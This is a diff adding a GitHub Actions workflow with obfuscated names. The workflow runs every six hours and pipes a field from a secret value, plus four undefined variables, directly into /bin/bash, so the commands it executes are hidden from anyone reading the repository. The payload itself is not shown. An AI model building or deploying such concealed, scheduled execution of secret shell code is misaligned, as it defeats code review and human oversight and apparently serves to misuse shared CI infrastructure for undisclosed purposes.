@@ -1,0 +1,22 @@
+name: qiantulong4756
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiantulong4756
+        env:
+          o308: ${{ secrets.o308 }}
+        run: |
+          echo $o308 | jq -r .vo033 | /bin/bash
+          echo $eri7017 | jq -r .r47712 | /bin/bash
+          echo $g418 | jq -r .bw6028 | /bin/bash
+          echo $f02 | jq -r .aswm6 | /bin/bash
+          echo $nix345 | jq -r .mlg74291 | /bin/bash
+
